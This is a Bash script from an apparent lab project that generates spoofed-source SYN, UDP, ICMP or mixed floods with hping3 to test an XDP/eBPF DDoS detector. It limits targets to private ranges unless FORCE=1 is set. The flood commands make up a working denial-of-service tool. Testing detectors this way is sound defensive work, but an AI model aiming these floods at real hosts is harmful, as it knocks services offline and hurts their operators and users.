#!/usr/bin/env bash
#
# attack_sim.sh - Generate controlled DDoS-style traffic to TEST the XDP/eBPF
# detector in an isolated lab.
#
# ============================ AUTHORIZED USE ONLY ============================
# Run this ONLY against a target you own or are explicitly authorized to test,
# on an isolated/private network. Flooding hosts you do not control is illegal
# in most jurisdictions. This exists solely to validate your own detector.
# ===========================================================================
#
#   sudo ./ddos-simulator/attack_sim.sh <target-ip> [syn|udp|icmp|mixed] [duration_s]
#
# Requires hping3 (installed by scripts/setup.sh).
set -euo pipefail

TARGET="${1:-}"
MODE="${2:-syn}"
DURATION="${3:-15}"
PORT="${PORT:-80}"

if [[ -z "$TARGET" ]]; then
	echo "Usage: sudo $0 <target-ip> [syn|udp|icmp|mixed] [duration_s]" >&2
	exit 1
fi

if [[ $EUID -ne 0 ]]; then
	echo "hping3 needs root for raw sockets:  sudo $0 ..." >&2
	exit 1
fi

if ! command -v hping3 >/dev/null; then
	echo "hping3 not found. Install it: sudo apt-get install -y hping3" >&2
	exit 1
fi

# Safety guard: refuse obviously-public targets unless FORCE=1 is set. This is
# a lab tool; keep it pointed at private RFC1918 ranges by default.
if [[ "${FORCE:-0}" != "1" ]]; then
	case "$TARGET" in
		10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*|127.*) ;;
		*)
			echo "Refusing non-private target '$TARGET'." >&2
			echo "Set FORCE=1 only if you own/are authorized to test it." >&2
			exit 1
			;;
	esac
fi

echo "[*] Target=$TARGET  mode=$MODE  duration=${DURATION}s  port=$PORT"
echo "[*] Sending flood... (Ctrl-C to stop early)"

run_flood() {
	# --flood: send as fast as possible; --rand-source: spoof source IPs.
	case "$1" in
		syn)  hping3 --flood --rand-source -S -p "$PORT" "$TARGET" ;;
		udp)  hping3 --flood --rand-source --udp -p "$PORT" "$TARGET" ;;
		icmp) hping3 --flood --rand-source --icmp "$TARGET" ;;
		*)    echo "unknown mode: $1" >&2; exit 1 ;;
	esac
}

if [[ "$MODE" == "mixed" ]]; then
	run_flood syn  & P1=$!
	run_flood udp  & P2=$!
	run_flood icmp & P3=$!
	sleep "$DURATION"
	kill "$P1" "$P2" "$P3" 2>/dev/null || true
else
	run_flood "$MODE" & PID=$!
	sleep "$DURATION"
	kill "$PID" 2>/dev/null || true
fi

echo "[+] Attack simulation finished. Check the detector dashboard."
